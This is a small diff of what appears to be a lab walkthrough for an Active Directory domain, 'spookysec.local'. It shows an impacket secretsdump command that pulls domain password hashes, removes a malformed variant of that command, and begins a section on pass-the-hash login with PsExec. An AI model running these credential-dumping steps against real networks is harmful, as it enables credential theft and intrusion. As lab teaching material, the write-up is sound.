@@ -118,9 +118,7 @@ Now, we need to retrieve all of the password hashes that this user account has t
 ```bash
 secretsdump.py -just-dc backup@spookysec.local
 ```	
-```bash
-secretdump.py spookysec.local/backup:password--just-dc
-```
+
 
 ## Log in with PsExec by "Passing the hash"
 `Note that this is not a vulnerability, this is how kerberos works`
